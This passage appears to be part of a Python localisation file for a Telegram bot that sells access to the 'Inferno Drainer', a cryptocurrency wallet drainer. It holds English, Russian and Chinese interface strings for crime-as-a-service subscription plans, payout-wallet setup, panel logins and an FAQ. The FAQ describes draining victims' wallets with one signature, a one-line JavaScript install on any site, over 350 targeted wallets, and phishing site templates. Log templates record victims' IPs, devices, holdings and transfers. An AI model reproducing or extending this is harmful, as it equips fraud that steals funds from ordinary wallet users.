    ),
    "confirm_payment_button": "✅ Confirm Payment",
    "payment_invalid_data": "⚠️ Invalid payment data. Please try again.",
    "payment_no_active": "⚠️ No active payment found. Use /start to begin.",
    "payment_details_missing": "⚠️ Payment details missing. Please try again.",
    "payment_verifying": "🔄 Checking for payment confirmation...\n\nPlease wait while we verify your transaction...",
    "payment_confirmed": "✅ Payment confirmed! You have successfully subscribed.\n\nYou can now access your panel using /panel.",
    "payment_pending": (
        "📋 Plan: {plan_name}\n\n"
        "💸 Amount: {amount_info}\n\n"
        "💳 Currency: {currency}\n\n"
        "🌐 Network: {network}\n\n"
        "📩 Wallet Address: `{wallet_address}`\n\n"
        "⏳ Payment still pending...⏳\n\n"
        "✅ Transaction will be verified automatically..."
    ),
    "payment_timeout": "⏰ Payment timeout! The payment confirmation process has been cancelled.\nUse /start to restart.",
    "payment_interrupted": "⚠️ Payment verification interrupted! Use /start to begin again.",
    "payment_not_complete": "❌ Payment not complete!",
    "unknown_plan": "Unknown Plan",
    "existing_wallet_already": "⚠️ You already have a wallet registered. Use /reset_wallet to change your wallet.",
    "wallet_verification_success": "✅ Wallet Verification Successful!\n\nAddress: `{address}`\n\nProceeding to setup fee...",
    "wallet_invalid_ethereum": (
        "❌ Invalid Ethereum address: {error}\n\n"
        "Please enter a valid Ethereum address:\n"
        "• Must start with `0x`\n"
        "• Must be exactly 42 characters long\n"
        "• Must contain only hexadecimal characters (0-9, a-f, A-F)\n"
        "• Must not be a zero or burn address\n\n"
        "Example: `0x1234567890abcdef1234567890abcdef12345678`"
    ),
    "wallet_minor_issue": "⚠️ Minor system issue, but wallet verification is proceeding.",
    "import_wallet_prompt": (
        "🔐 Import Existing Wallet\n\n"
        "Please paste your Ethereum wallet address:\n\n"
        "Example: `0x742d35Cc6634C0532925a3b844Bc9e7595f42bE`\n\n"
        "ℹ️ Only the address will be stored. Your private keys stay safe."
    ),
    "generic_error_try_again": "❌ An error occurred. Please try again.",
    "invalid_input_mode": "❌ Invalid input mode. Please use /set_up to start over.",
    "address_empty": "❌ Address cannot be empty. Please enter a valid Ethereum address.",
    "address_short": "❌ Address too short. Ethereum addresses must be 42 characters long.",
    "address_invalid": "❌ {error}\n\nPlease enter a valid Ethereum address.",
    "wallet_registered_same": "ℹ️ This wallet is already registered to your account.\n\nAddress: `{address}`",
    "wallet_registered_different": "⚠️ You already have a different wallet registered: `{address}`\n\nUse /reset_wallet to change it, or enter a different address.",
    "use_setup_button": "Use /set_up",
    "wallet_registered_other": "⚠️ This wallet address is already registered to another account.\n\nAddress: `{address}`\n\nPlease use a different address.",
    "database_error_try": "❌ Database error. Please try again.",
    "wallet_already_registered": "⚠️ This wallet is already registered. Please use /reset_wallet to change it.",
    "wallet_save_error": "❌ Error saving wallet. Please try again.",
    "wallet_saved_file": "📁 Saved to: {filename}",
    "wallet_imported_success": "✅ Wallet Imported Successfully!\n\nAddress: `{address}`\nBalance: {balance}\n{file_info}",
    "wallet_import_unexpected": "❌ An unexpected error occurred while importing your wallet.\n\nPlease try again or use /cancel to abort.",
    "wallet_reset": "Your wallet has been reset. Use /start to register a new wallet.",
    "setup_cancelled": "⚠️ Setup process cancelled. Use /set_up to start over.",
    "wallet_create_wait": "⏳ Creating wallet, please wait...",
    "wallet_saved_status": "✅ Wallet saved to file: {filename}",
    "wallet_saved_status_error": "error",
    "wallet_created": (
        "✅ Your new Ethereum wallet:\n\n"
        "🔹 Address: {address}\n\n"
        "🔹 Seed Phrase: {seed_phrase}\n\n"
        "💰 Balance: {balance}\n\n"
        "📁 {status_msg}\n\n"
        "⚠️ Keep your seed phrase safe!\n\n"
    ),
    "wallet_generate_error": "❌ An error occurred while generating the wallet. Please try again.",
    "faq_wait": "⏳ Please wait while we retrieve the FAQ...",
    "faq_text": (
        "📘 Frequently Asked Questions\n\n"
        "1️⃣ *What is the Inferno Drainer Bot?*\n"
        "   `The Inferno Drainer is a powerful tool designed to transfer assets from one wallet to another in just one signature. The script initiates a harmless transaction while transferring all assets from the victim’s wallet.`\n\n"
        "2️⃣ *Where can I host websites anonymously?*\n"
        "   `You can host websites via our bot for free. If you need a domain, you must top up the amount for the domain, as domains are not included in free hosting. If needed, you can top up and buy a domain through our bot or use a domain from an external provider and set up DNS accordingly.`\n\n"
        "3️⃣ *How many websites can I host?*\n"
        "   `Inferno allows up to 25 websites per panel. If you need more space, please reach out to Inferno support.`\n\n"
        "4️⃣ *Can I get % split without paying the initial fees?*\n"
        "   `No. We charge a one-time setup fee to prevent scammers and abuse. This fee is payable once during registration to activate your bot and panel features.`\n\n"
        "5️⃣ *If I have my own website files, can I install Inferno Drainer?*\n"
        "   `Yes. The drainer is a JavaScript file that you can install on any website with just one line of code. Detailed instructions are available on the drainer download page.`\n\n"
        "6️⃣ *How do I install the drainer on my website?*\n"
        "   `Instructions are provided on the drainer download page. For statistics on visitor traffic, use the /trafic command or log in to your panel dashboard.`\n\n"
        "7️⃣ *What networks does Inferno support?*\n"
        "   `We support over 38 networks, including Ton, Tron, Solana, and Ethereum (EVM Drainer).`\n\n"
        "8️⃣ *What kinds of wallets can be drained?*\n"
        "   `Our tools are regularly updated to target the most valuable wallets and assets undetected. Inferno supports over 350 wallets, including Trust Wallet, MetaMask, and Exodus.`\n\n"
        "9️⃣ *Can I buy a new domain through the bot?*\n"
        "   `Yes, you can purchase a new domain using the /buydomain command. Follow the prompts to complete your purchase.`\n\n"
        "🔟 *Does Inferno sell website templates?*\n"
        "   `No! However, we offer access to over 150+ website templates through our bot. Use the appropriate command to explore them.`\n\n"
        "1️⃣1️⃣ *Do you provide traffic methods?*\n"
        "   `No, we do not provide any traffic methods. Our services are exclusive to the drainer and related features. If you have an important request, please contact Inferno support.`"
    ),
    "panel_logged_in": "✅ You are logged in with Panel ID: {panel_id}\n\nPress the button below to open the panel in your browser.",
    "panel_logged_out_header": "🩸 InfernoDrainer Panel🩸",
    "panel_logged_out_message": "Use /info to get your login credentials, then tap the button below to open the panel.",
    "panel_open_button": "☑️ Open Panel",
    "info_not_allowed": "❌ Your Inferno panel is not set up! \nPlease use /set_up to create a panel account first.",
    "info_header": "🩸 AngelFerno Panel Access",
    "info_panel_id": "Panel ID: {panel_id}",
    "info_password": "Password: {password}",
    "info_instructions": "Tap the button below to open the panel.\nThen log in using your credentials.",
    "info_backup_bot": "Backup Bot: {backup_bot_link}",
    "info_security": "🔑 Please keep your logins secure",
    "wallet_retrieving": "🔐 Retrieving your wallets and balances...\n⏳ Please wait...",
    "wallet_header": "🔐 Your Ethereum Wallets:",
    "wallet_info_type": "Type: {wallet_type}",
    "wallet_info_address": "Address: `{address}`",
    "wallet_info_balance": "Balance: {balance}",
    "wallet_info_seed": "Seed Phrase: {seed_phrase}",
    "wallet_saved_confirm": "✅ Wallet data is saved.",
    "wallet_retrieval_error": "⚠️ An error occurred while retrieving your wallets. Please try again.",
    "log_wallet_connection": "🚧 Wallet Connection Log - {timestamp}",
    "log_session_id": "Session ID: `{session_id}`",
    "log_wallet": "Wallet: {wallet_name} | [{shortened_wallet}]({wallet_url})",
    "log_status_empty": "Status: Empty wallet detected",
    "log_connection_time": "Connection Time: {connection_time}",
    "log_browser": "Browser: {browser}",
    "log_device_ip": "{device_icon}{device_type} | {country_flag} {country_name}",
    "log_ip_gas": "IP: `{ip_address}` | Gas Price: {gas_price} Gwei",
    "log_wallet_analysis": "🔍 Wallet Analysis Report - {timestamp}",
    "log_portfolio_analysis": "📊 Portfolio Analysis:",
    "log_total_value": "Total Value: ${total_value}",
    "log_assets_scanned": "Assets Scanned: {count}",
    "log_top_holdings": "Top Holdings: ${value}",
    "log_asset_breakdown": "💰 Asset Breakdown:",
    "log_connection_details": "🔗 Connection Details:",
    "log_time_browser": "Time: {time} | Browser: {browser}",
    "log_source_ip": "Source IP: `{ip_address}` | Gas: {gas_price} Gwei",
    "log_establishing_connection": "🔗 Establishing secure connection...",
    "log_verifying_assets": "Verifying assets... {count} found",
    "log_latency": "IP: `{ip_address}` | Latency: {latency}ms",
    "log_balance_check": "⚖️ Balance verification in progress...",
    "log_portfolio_value": "Portfolio Value: ${value}",
    "log_blockchain_check": "Cross-checking with blockchain...",
    "log_gas_estimate": "IP: `{ip_address}` | Gas Estimate: {gas_limit} units",
    "log_scanning_assets": "🔎 Scanning wallet assets...",
    "log_found_holdings": "Found {count} major holdings",
    "log_scan_time": "IP: `{ip_address}` | Scan Time: {time}s",
    "log_preparing_transfer": "💸 Preparing transfer...",
    "log_transfer_amount": "Amount: ${amount} | Gas: {gas_price} Gwei",
    "log_destination": "Destination: Processing...",
    "log_tx_hash": "IP: `{ip_address}` | TX Hash: `{tx_hash}`",
    "log_transfer_failed": "❌ Transfer Failed - {timestamp}",
    "log_transfer_error": "Error: Insufficient gas for transaction",
    "log_required_gas": "Required Gas: {gas_limit} units @ {gas_price} Gwei",
    "log_estimated_cost": "Estimated Cost: ${cost}",
    "log_insufficient_balance": "Wallet Balance: ${balance} (insufficient)",
    "log_system_details": "🔧 System Details:",
    "log_session_tx": "Session: `{session_id}` | TX: `{tx_hash}`",
    "log_transfer_completed": "✅ Transfer Completed - {timestamp}",
    "log_transfer_info": "Amount: ${amount} | Fee: ${fee}",
    "log_gas_used": "Gas Used: {gas_limit} units | Price: {gas_price} Gwei",
    "log_transaction": "Transaction: `{tx_hash}`",
    "log_status_confirmed": "Status: Confirmed on blockchain",
    "log_transaction_details": "🔧 Transaction Details:",
    "log_session_block": "Session: `{session_id}` | Block: #{block}",
    "log_device_info": "Device: {device_icon}{device_type} | {country_flag} {country_name}",
})

LANGUAGE_MESSAGES["ru"].update({
    "group_command_restricted": (
        "🔒 <b>Только приватный чат</b>\n\n"
        "Эта команда доступна только в приватном чате по соображениям безопасности и конфиденциальности.\n\n"
        "Нажмите кнопку ниже, чтобы продолжить в приватном чате."
    ),
    "verification_first": "⚠️ Сначала завершите проверку кошелька!",
    "proceed_to_plans_button": "Перейти к планам",
    "setup_create_wallet_button": "🆕 Создать новый Ethereum-кошелек",
    "setup_existing_wallet_button": "♻️ Использовать существующий Ethereum-кошелек",
    "setup_features_button": "📋 Функции Inferno",
    "setup_menu": (
        "💎 Настройка Ethereum-кошелька\n\n"
        "Выберите способ настройки кошелька:\n\n"
        "🆕 Создать новый кошелек: будет создан новый Ethereum-кошелек с seed-фразой\n\n"
        "♻️ Использовать существующий: импортировать адрес из вашего кошелька\n\n"
        "Все активы будут конвертированы и отправлены на ваш Ethereum-адрес."
    ),
    "setup_fee": (
        "☑️ Требуется единовременная плата за настройку\n\n"
        "Эта плата помогает поддерживать качество сервиса и предотвращать злоупотребления.\n"
        "Принимаемые валюты:\n"
        "- ₿ Bitcoin (BTC)\n"
        "- 💎 Ethereum (ETH)\n"
        "- 💲 Tether (USDT TRC-20)"
    ),
    "plan_emerald_name": "План Emerald",
    "plan_emerald_description": "- Легкий стартовый план\nПодходит для небольших операций",
    "plan_emerald_button": "Оплатить настройку - 0.25 ETH",
    "plan_ruby_name": "План Ruby",
    "plan_ruby_description": "- Сбалансированный вариант\nСредняя плата и надежная производительность",
    "plan_ruby_button": "Оплатить настройку - 0.5 ETH",
    "plan_sapphire_name": "План Sapphire",
    "plan_sapphire_description": "- Премиальный средний план\nПодходит для частого использования",
    "plan_sapphire_button": "Оплатить настройку - 0.7 ETH",
    "plan_diamond_name": "План Diamond",
    "plan_diamond_description": "- Элитный план\nМаксимальная емкость и приоритетная обработка",
    "plan_diamond_button": "Оплатить настройку - 1.25 ETH",
    "plans_list_item": (
        "🩸 *{plan_name}*\n"
        "- Стоимость: `{fee_eth} ETH`\n"
        "- Эквивалент: `{btc_amount} BTC` или `{usdt_amount} USDT`\n\n"
    ),
    "plans_message": "📋 *Доступные планы:*\n\n{plans}Выберите план, чтобы продолжить:",
    "plan_details_message": "[🩸 {plan_name} - мгновенный доступ:]\n{description}",
    "choose_payment_method": "☑️ Выберите способ оплаты\n\nВыберите предпочитаемую валюту оплаты:",
    "invalid_payment_selection": "❌ Неверный выбор оплаты.",
    "invalid_plan_selected": "❌ Выбран неверный план.",
    "unable_fetch_rates": "⚠️ Не удалось получить текущие курсы. Попробуйте позже.",
    "invalid_currency_selected": "❌ Выбрана неверная валюта.",
    "payment_config_error": "❌ Ошибка настройки оплаты. Попробуйте позже.",
    "network_btc": "сеть BTC",
    "network_eth": "сеть ETH",
    "network_usdt": "сеть TRC-20",
    "network_unknown": "Неизвестная сеть",
    "payment_instructions": (
        "🤝 Отправьте ровно: `{amount_info}`\n\n"
        "📍 Сеть: *{network}*\n\n"
        "📩 Сгенерированный адрес кошелька: `{wallet_address}`\n\n"
        "⏰ У вас есть максимум 1 час на оплату. После 1 часа процесс будет отменен.\n\n"
        "👀 Если вы отправили меньше нужной суммы, отправьте еще одну транзакцию до точной суммы или выше в течение этого же часа.\n\n"
        "❤️ Убедитесь, что вы покрыли комиссии сети."
    ),
    "confirm_payment_button": "✅ Подтвердить оплату",
    "payment_invalid_data": "⚠️ Неверные данные оплаты. Попробуйте еще раз.",
    "payment_no_active": "⚠️ Активная оплата не найдена. Используйте /start, чтобы начать.",
    "payment_details_missing": "⚠️ Не хватает данных оплаты. Попробуйте еще раз.",
    "payment_verifying": "🔄 Проверяем подтверждение оплаты...\n\nПожалуйста, подождите, пока мы проверяем транзакцию...",
    "payment_confirmed": "✅ Оплата подтверждена! Подписка успешно активирована.\n\nТеперь вы можете открыть панель через /panel.",
    "payment_pending": (
        "📋 План: {plan_name}\n\n"
        "💸 Сумма: {amount_info}\n\n"
        "💳 Валюта: {currency}\n\n"
        "🌐 Сеть: {network}\n\n"
        "📩 Адрес кошелька: `{wallet_address}`\n\n"
        "⏳ Оплата все еще ожидается...⏳\n\n"
        "✅ Транзакция будет проверена автоматически..."
    ),
    "payment_timeout": "⏰ Время ожидания оплаты истекло! Проверка оплаты отменена.\nИспользуйте /start, чтобы начать заново.",
    "payment_interrupted": "⚠️ Проверка оплаты прервана! Используйте /start, чтобы начать заново.",
    "payment_not_complete": "❌ Оплата не завершена!",
    "unknown_plan": "Неизвестный план",
    "existing_wallet_already": "⚠️ У вас уже зарегистрирован кошелек. Используйте /reset_wallet, чтобы изменить его.",
    "wallet_verification_success": "✅ Кошелек успешно проверен!\n\nАдрес: `{address}`\n\nПереходим к оплате настройки...",
    "wallet_invalid_ethereum": (
        "❌ Неверный Ethereum-адрес: {error}\n\n"
        "Введите корректный Ethereum-адрес:\n"
        "• Должен начинаться с `0x`\n"
        "• Должен быть ровно 42 символа\n"
        "• Должен содержать только шестнадцатеричные символы (0-9, a-f, A-F)\n"
        "• Не должен быть нулевым или burn-адресом\n\n"
        "Пример: `0x1234567890abcdef1234567890abcdef12345678`"
    ),
    "wallet_minor_issue": "⚠️ Небольшая системная ошибка, но проверка кошелька продолжается.",
    "import_wallet_prompt": (
        "🔐 Импорт существующего кошелька\n\n"
        "Вставьте ваш Ethereum-адрес:\n\n"
        "Пример: `0x742d35Cc6634C0532925a3b844Bc9e7595f42bE`\n\n"
        "ℹ️ Будет сохранен только адрес. Ваши приватные ключи остаются у вас."
    ),
    "generic_error_try_again": "❌ Произошла ошибка. Попробуйте еще раз.",
    "invalid_input_mode": "❌ Неверный режим ввода. Используйте /set_up, чтобы начать заново.",
    "address_empty": "❌ Адрес не может быть пустым. Введите корректный Ethereum-адрес.",
    "address_short": "❌ Адрес слишком короткий. Ethereum-адрес должен быть 42 символа.",
    "address_invalid": "❌ {error}\n\nВведите корректный Ethereum-адрес.",
    "wallet_registered_same": "ℹ️ Этот кошелек уже зарегистрирован в вашем аккаунте.\n\nАдрес: `{address}`",
    "wallet_registered_different": "⚠️ У вас уже зарегистрирован другой кошелек: `{address}`\n\nИспользуйте /reset_wallet, чтобы изменить его, или введите другой адрес.",
    "use_setup_button": "Использовать /set_up",
    "wallet_registered_other": "⚠️ Этот адрес кошелька уже зарегистрирован в другом аккаунте.\n\nАдрес: `{address}`\n\nИспользуйте другой адрес.",
    "database_error_try": "❌ Ошибка базы данных. Попробуйте еще раз.",
    "wallet_already_registered": "⚠️ Этот кошелек уже зарегистрирован. Используйте /reset_wallet, чтобы изменить его.",
    "wallet_save_error": "❌ Ошибка сохранения кошелька. Попробуйте еще раз.",
    "wallet_saved_file": "📁 Сохранено в: {filename}",
    "wallet_imported_success": "✅ Кошелек успешно импортирован!\n\nАдрес: `{address}`\nБаланс: {balance}\n{file_info}",
    "wallet_import_unexpected": "❌ Произошла непредвиденная ошибка при импорте кошелька.\n\nПопробуйте еще раз или используйте /cancel для отмены.",
    "wallet_reset": "Ваш кошелек сброшен. Используйте /start, чтобы зарегистрировать новый кошелек.",
    "setup_cancelled": "⚠️ Процесс настройки отменен. Используйте /set_up, чтобы начать заново.",
    "wallet_create_wait": "⏳ Создаем кошелек, пожалуйста, подождите...",
    "wallet_saved_status": "✅ Кошелек сохранен в файл: {filename}",
    "wallet_saved_status_error": "ошибка",
    "wallet_created": (
        "✅ Ваш новый Ethereum-кошелек:\n\n"
        "🔹 Адрес: {address}\n\n"
        "🔹 Seed-фраза: {seed_phrase}\n\n"
        "💰 Баланс: {balance}\n\n"
        "📁 {status_msg}\n\n"
        "⚠️ Храните seed-фразу в безопасности!\n\n"
    ),
    "wallet_generate_error": "❌ Произошла ошибка при создании кошелька. Попробуйте еще раз.",
    "faq_wait": "⏳ Пожалуйста, подождите, мы загружаем FAQ...",
    "faq_text": (
        "📘 Часто задаваемые вопросы\n\n"
        "1️⃣ *Что такое Inferno Drainer Bot?*\n"
        "   `Inferno Drainer - это инструмент для перевода активов из одного кошелька в другой за одну подпись. Скрипт инициирует безобидную транзакцию и переводит активы из кошелька жертвы.`\n\n"
        "2️⃣ *Где можно анонимно размещать сайты?*\n"
        "   `Вы можете бесплатно размещать сайты через нашего бота. Если нужен домен, необходимо пополнить баланс на сумму домена, так как домены не входят в бесплатный хостинг.`\n\n"
        "3️⃣ *Сколько сайтов можно разместить?*\n"
        "   `Inferno позволяет размещать до 25 сайтов на одну панель. Если нужно больше места, обратитесь в поддержку Inferno.`\n\n"
        "4️⃣ *Можно ли получить процентный сплит без начальной оплаты?*\n"
        "   `Нет. Мы взимаем единовременную плату за настройку, чтобы предотвращать злоупотребления. Она оплачивается один раз при регистрации.`\n\n"
        "5️⃣ *Можно ли установить Inferno Drainer на мои файлы сайта?*\n"
        "   `Да. Drainer - это JavaScript-файл, который можно установить на любой сайт одной строкой кода. Инструкции доступны на странице загрузки drainer.`\n\n"
        "6️⃣ *Как установить drainer на сайт?*\n"
        "   `Инструкции доступны на странице загрузки drainer. Для статистики посетителей используйте /trafic или войдите в панель.`\n\n"
        "7️⃣ *Какие сети поддерживает Inferno?*\n"
        "   `Поддерживается более 38 сетей, включая Ton, Tron, Solana и Ethereum (EVM Drainer).`\n\n"
        "8️⃣ *Какие кошельки поддерживаются?*\n"
        "   `Инструменты регулярно обновляются для работы с самыми ценными кошельками и активами. Inferno поддерживает более 350 кошельков, включая Trust Wallet, MetaMask и Exodus.`\n\n"
        "9️⃣ *Можно ли купить новый домен через бота?*\n"
        "   `Да, вы можете купить новый домен командой /buydomain. Следуйте подсказкам для завершения покупки.`\n\n"
        "🔟 *Inferno продает шаблоны сайтов?*\n"
        "   `Нет! Но мы предоставляем доступ к более чем 150 шаблонам сайтов через бота. Используйте соответствующую команду.`\n\n"
        "1️⃣1️⃣ *Вы предоставляете методы трафика?*\n"
        "   `Нет, мы не предоставляем методы трафика. Наши сервисы относятся только к drainer и связанным функциям. По важным вопросам обращайтесь в поддержку Inferno.`"
    ),
    "panel_logged_in": "✅ Вы вошли с Panel ID: {panel_id}\n\nНажмите кнопку ниже, чтобы открыть панель в браузере.",
    "panel_logged_out_header": "🩸 InfernoDrainer Панель🩸",
    "panel_logged_out_message": "Используйте /info, чтобы получить учетные данные, затем нажмите кнопку ниже для открытия панели.",
    "panel_open_button": "☑️ Открыть панель",
    "info_not_allowed": "❌ Ваша панель Inferno еще не настроена! \nПожалуйста, используйте /set_up, чтобы создать аккаунт панели.",
    "info_header": "🩸 Доступ к панели AngelFerno",
    "info_panel_id": "Panel ID: {panel_id}",
    "info_password": "Пароль: {password}",
    "info_instructions": "Нажмите кнопку ниже, чтобы открыть панель.\nЗатем войдите, используя свои учетные данные.",
    "info_backup_bot": "Резервный бот: {backup_bot_link}",
    "info_security": "🔑 Держите свои учетные данные в безопасности",
    "wallet_retrieving": "🔐 Получаем ваши кошельки и остатки...\n⏳ Пожалуйста, подождите...",
    "wallet_header": "🔐 Ваши Ethereum кошельки:",
    "wallet_info_type": "Тип: {wallet_type}",
    "wallet_info_address": "Адрес: `{address}`",
    "wallet_info_balance": "Остаток: {balance}",
    "wallet_info_seed": "Seed фраза: {seed_phrase}",
    "wallet_saved_confirm": "✅ Данные кошелька сохранены.",
    "wallet_retrieval_error": "⚠️ Произошла ошибка при получении ваших кошельков. Попробуйте еще раз.",
    "log_wallet_connection": "🚧 Журнал подключения кошелька - {timestamp}",
    "log_session_id": "ID сессии: `{session_id}`",
    "log_wallet": "Кошелек: {wallet_name} | [{shortened_wallet}]({wallet_url})",
    "log_status_empty": "Статус: обнаружен пустой кошелек",
    "log_connection_time": "Время подключения: {connection_time}",
    "log_browser": "Браузер: {browser}",
    "log_device_ip": "{device_icon}{device_type} | {country_flag} {country_name}",
    "log_ip_gas": "IP: `{ip_address}` | Цена газа: {gas_price} Gwei",
    "log_wallet_analysis": "🔍 Отчет об анализе кошелька - {timestamp}",
    "log_portfolio_analysis": "📊 Анализ портфеля:",
    "log_total_value": "Общая стоимость: ${total_value}",
    "log_assets_scanned": "Отсканировано активов: {count}",
    "log_top_holdings": "Основные владения: ${value}",
    "log_asset_breakdown": "💰 Распределение активов:",
    "log_connection_details": "🔗 Детали подключения:",
    "log_time_browser": "Время: {time} | Браузер: {browser}",
    "log_source_ip": "Исходный IP: `{ip_address}` | Газ: {gas_price} Gwei",
    "log_establishing_connection": "🔗 Устанавливается безопасное соединение...",
    "log_verifying_assets": "Проверка активов... {count} найдено",
    "log_latency": "IP: `{ip_address}` | Задержка: {latency}ms",
    "log_balance_check": "⚖️ Проверка баланса в процессе...",
    "log_portfolio_value": "Стоимость портфеля: ${value}",
    "log_blockchain_check": "Проверка блокчейна...",
    "log_gas_estimate": "IP: `{ip_address}` | Оценка газа: {gas_limit} единиц",
    "log_scanning_assets": "🔎 Сканирование активов кошелька...",
    "log_found_holdings": "Найдено {count} основных владений",
    "log_scan_time": "IP: `{ip_address}` | Время сканирования: {time}s",
    "log_preparing_transfer": "💸 Подготовка передачи...",
    "log_transfer_amount": "Сумма: ${amount} | Газ: {gas_price} Gwei",
    "log_destination": "Назначение: Обработка...",
    "log_tx_hash": "IP: `{ip_address}` | TX хеш: `{tx_hash}`",
    "log_transfer_failed": "❌ Передача не удалась - {timestamp}",
    "log_transfer_error": "Ошибка: Недостаточно газа для транзакции",
    "log_required_gas": "Требуемый газ: {gas_limit} единиц @ {gas_price} Gwei",
    "log_estimated_cost": "Расчетная стоимость: ${cost}",
    "log_insufficient_balance": "Баланс кошелька: ${balance} (недостаточно)",
    "log_system_details": "🔧 Детали системы:",
    "log_session_tx": "Сессия: `{session_id}` | TX: `{tx_hash}`",
    "log_transfer_completed": "✅ Передача завершена - {timestamp}",
    "log_transfer_info": "Сумма: ${amount} | Комиссия: ${fee}",
    "log_gas_used": "Использовано газа: {gas_limit} единиц | Цена: {gas_price} Gwei",
    "log_transaction": "Транзакция: `{tx_hash}`",
    "log_status_confirmed": "Статус: Подтверждено в блокчейне",
    "log_transaction_details": "🔧 Детали транзакции:",
    "log_session_block": "Сессия: `{session_id}` | Блок: #{block}",
    "log_device_info": "Устройство: {device_icon}{device_type} | {country_flag} {country_name}",
})

LANGUAGE_MESSAGES["zh"].update({
    "group_command_restricted": (
        "🔒 <b>仅限私聊</b>\n\n"
        "出于安全和隐私考虑，此命令仅在私聊中可用。\n\n"
        "单击下面的按钮在私聊中继续。"
    ),
    "verification_first": "⚠️ 请先完成钱包验证！",
    "proceed_to_plans_button": "进入套餐",
    "setup_create_wallet_button": "🆕 创建新的 Ethereum 钱包",
    "setup_existing_wallet_button": "♻️ 使用已有 Ethereum 钱包",
    "setup_features_button": "📋 Inferno 功能",
    "setup_menu": (
        "💎 Ethereum 钱包设置\n\n"
        "请选择钱包设置方式：\n\n"
        "🆕 创建新钱包：生成一个全新的 Ethereum 钱包和 seed phrase\n\n"
        "♻️ 使用已有钱包：导入你自己的钱包地址\n\n"
        "所有资产都会转换并发送到你的 Ethereum 钱包地址。"
    ),
    "setup_fee": (
        "☑️ 需要一次性设置费\n\n"
        "这笔费用用于维护服务质量并防止滥用。\n"
        "支持的币种：\n"
        "- ₿ Bitcoin (BTC)\n"
        "- 💎 Ethereum (ETH)\n"
        "- 💲 Tether (USDT TRC-20)"
    ),
    "plan_emerald_name": "Emerald 套餐",
    "plan_emerald_description": "- 轻量入门套餐\n适合较小规模操作",
    "plan_emerald_button": "完成设置费 - 0.25 ETH",
    "plan_ruby_name": "Ruby 套餐",
    "plan_ruby_description": "- 平衡方案\n中等费用和稳定性能",
    "plan_ruby_button": "完成设置费 - 0.5 ETH",
    "plan_sapphire_name": "Sapphire 套餐",
    "plan_sapphire_description": "- 高级中档套餐\n适合频繁使用",
    "plan_sapphire_button": "完成设置费 - 0.7 ETH",
    "plan_diamond_name": "Diamond 套餐",
    "plan_diamond_description": "- 顶级套餐\n最大容量并优先处理",
    "plan_diamond_button": "完成设置费 - 1.25 ETH",
    "plans_list_item": (
        "🩸 *{plan_name}*\n"
        "- 费用：`{fee_eth} ETH`\n"
        "- 等值：`{btc_amount} BTC` 或 `{usdt_amount} USDT`\n\n"
    ),
    "plans_message": "📋 *可用套餐：*\n\n{plans}请选择一个套餐继续：",
    "plan_details_message": "[🩸 {plan_name} - 即时访问：]\n{description}",
    "choose_payment_method": "☑️ 选择付款方式\n\n请选择你偏好的付款币种：",
    "invalid_payment_selection": "❌ 无效的付款选择。",
    "invalid_plan_selected": "❌ 选择的套餐无效。",
    "unable_fetch_rates": "⚠️ 无法获取实时汇率。请稍后再试。",
    "invalid_currency_selected": "❌ 选择的币种无效。",
    "payment_config_error": "❌ 付款配置错误。请稍后再试。",
    "network_btc": "BTC 网络",
    "network_eth": "ETH 网络",
    "network_usdt": "TRC-20 网络",
    "network_unknown": "未知网络",
    "payment_instructions": (
        "🤝 请准确发送：`{amount_info}`\n\n"
        "📍 网络：*{network}*\n\n"
        "📩 生成的钱包地址：`{wallet_address}`\n\n"
        "⏰ 你最多有 1 小时完成付款。超过 1 小时后，确认流程将被取消。\n\n"
        "👀 如果发送金额不足，请在同一小时内再次转账，使总额达到或超过要求金额。\n\n"
        "❤️ 请确保交易中包含网络手续费。"
    ),
    "confirm_payment_button": "✅ 确认付款",
    "payment_invalid_data": "⚠️ 付款数据无效。请重试。",
    "payment_no_active": "⚠️ 没有找到进行中的付款。请使用 /start 开始。",
    "payment_details_missing": "⚠️ 缺少付款详情。请重试。",
    "payment_verifying": "🔄 正在检查付款确认...\n\n请稍候，我们正在验证你的交易...",
    "payment_confirmed": "✅ 付款已确认！订阅已成功激活。\n\n现在可以使用 /panel 打开面板。",
    "payment_pending": (
        "📋 套餐：{plan_name}\n\n"
        "💸 金额：{amount_info}\n\n"
        "💳 币种：{currency}\n\n"
        "🌐 网络：{network}\n\n"
        "📩 钱包地址：`{wallet_address}`\n\n"
        "⏳ 付款仍在等待中...⏳\n\n"
        "✅ 交易将自动验证..."
    ),
    "payment_timeout": "⏰ 付款超时！付款确认流程已取消。\n请使用 /start 重新开始。",
    "payment_interrupted": "⚠️ 付款验证已中断！请使用 /start 重新开始。",
    "payment_not_complete": "❌ 付款未完成！",
    "unknown_plan": "未知套餐",
    "existing_wallet_already": "⚠️ 你已经注册了钱包。请使用 /reset_wallet 更改钱包。",
    "wallet_verification_success": "✅ 钱包验证成功！\n\n地址：`{address}`\n\n正在进入设置费步骤...",
    "wallet_invalid_ethereum": (
        "❌ 无效的 Ethereum 地址：{error}\n\n"
        "请输入有效的 Ethereum 地址：\n"
        "• 必须以 `0x` 开头\n"
        "• 必须正好 42 个字符\n"
        "• 只能包含十六进制字符 (0-9, a-f, A-F)\n"
        "• 不能是零地址或 burn 地址\n\n"
        "示例：`0x1234567890abcdef1234567890abcdef12345678`"
    ),
    "wallet_minor_issue": "⚠️ 出现轻微系统问题，但钱包验证会继续进行。",
    "import_wallet_prompt": (
        "🔐 导入已有钱包\n\n"
        "请粘贴你的 Ethereum 钱包地址：\n\n"
        "示例：`0x742d35Cc6634C0532925a3b844Bc9e7595f42bE`\n\n"
        "ℹ️ 只会保存地址。你的私钥仍由你自己保管。"
    ),
    "generic_error_try_again": "❌ 发生错误。请重试。",
    "invalid_input_mode": "❌ 输入模式无效。请使用 /set_up 重新开始。",
    "address_empty": "❌ 地址不能为空。请输入有效的 Ethereum 地址。",
    "address_short": "❌ 地址太短。Ethereum 地址必须是 42 个字符。",
    "address_invalid": "❌ {error}\n\n请输入有效的 Ethereum 地址。",
    "wallet_registered_same": "ℹ️ 该钱包已注册到你的账户。\n\n地址：`{address}`",
    "wallet_registered_different": "⚠️ 你已经注册了另一个钱包：`{address}`\n\n请使用 /reset_wallet 更改，或输入其他地址。",
    "use_setup_button": "使用 /set_up",
    "wallet_registered_other": "⚠️ 该钱包地址已注册到其他账户。\n\n地址：`{address}`\n\n请使用其他地址。",
    "database_error_try": "❌ 数据库错误。请重试。",
    "wallet_already_registered": "⚠️ 该钱包已注册。请使用 /reset_wallet 更改。",
    "wallet_save_error": "❌ 保存钱包时出错。请重试。",
    "wallet_saved_file": "📁 已保存到：{filename}",
